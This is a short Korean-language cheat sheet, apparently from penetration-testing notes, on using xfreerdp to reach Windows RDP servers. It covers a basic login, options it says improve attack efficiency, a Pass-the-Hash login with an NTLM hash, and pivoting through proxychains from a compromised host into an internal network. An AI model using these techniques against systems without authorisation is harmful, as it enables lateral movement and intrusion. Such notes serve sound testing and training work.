

# xfreerdp 원격 데스크톱 접속 가이드

RDP(Remote Desktop Protocol)는 Windows 시스템에 원격으로 접속하여 그래픽 사용자 인터페이스(GUI)를 제어하는 데 사용되는 프로토콜입니다. `xfreerdp`는 Linux 환경에서 Windows RDP 서버에 접속하기 위한 강력하고 유연한 클라이언트입니다.

---

### **1. 기본 접속**

- **목표:** 사용자 이름과 비밀번호를 사용하여 RDP 서버에 접속합니다.

```bash(title="xfreerdp 기본 접속")
# /v:<target_ip>: 접속할 RDP 서버의 IP 주소 또는 호스트명
# /u:<username>: 사용자 이름
# /p:<password>: 비밀번호
xfreerdp /v:$target /u:Administrator /p:Password123!
```

---

### **2. 유용한 옵션**

`xfreerdp`는 다양한 옵션을 제공하여 사용 편의성과 공격 효율성을 높일 수 있습니다.

| 옵션 | 설명 |
| :--- | :--- |
| `/f` | 전체 화면 모드로 접속합니다. |
| `/dynamic-resolution` | 클라이언트 창 크기에 맞춰 원격 해상도를 동적으로 조절합니다. |
| `+clipboard` | 클라이언트와 서버 간의 클립보드 공유를 활성화합니다. (`-clipboard`는 비활성화) |
| `/cert:ignore` | 서버 인증서 유효성 검사를 무시합니다. (테스트 환경에서 유용) |
| `/drive:<name>,<path>` | 로컬 디렉터리를 원격 세션에 드라이브로 리다이렉션합니다. 파일 전송에 매우 유용합니다. (예: `/drive:kali,/root/share`) |
| `/admin` | 관리자 세션으로 접속을 시도합니다. |

```bash(title="xfreerdp 유용한 옵션 활용")
# 클립보드 공유, 드라이브 리다이렉션, 인증서 무시, 동적 해상도 적용
xfreerdp /v:$target /u:Administrator /p:Password123! +clipboard /drive:kali,/root/share /cert:ignore /dynamic-resolution
```

---

### **3. Pass-the-Hash (PTH) 접속**

- **목표:** 비밀번호 대신 NTLM 해시를 사용하여 RDP 서버에 접속합니다. 이는 비밀번호를 알 수 없지만 해시를 획득한 경우에 유용합니다.

```bash(title="xfreerdp PTH 접속")
# /pth:<ntlm_hash>: NTLM 해시를 사용하여 인증
xfreerdp /v:$target /u:Administrator /pth:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
```

---

### **4. Proxychains 연동 (피버팅)**

- **목표:** `proxychains`를 통해 `xfreerdp`를 실행하여, 이미 장악한 시스템을 경유하여 내부망의 RDP 서버에 접속합니다.

```bash(title="Proxychains를 통한 xfreerdp 접속")
# proxychains 설정 파일에 SOCKS 프록시가 올바르게 설정되어 있어야 함
proxychains xfreerdp /v:$internal_target_ip /u:Administrator /p:Password123!
```

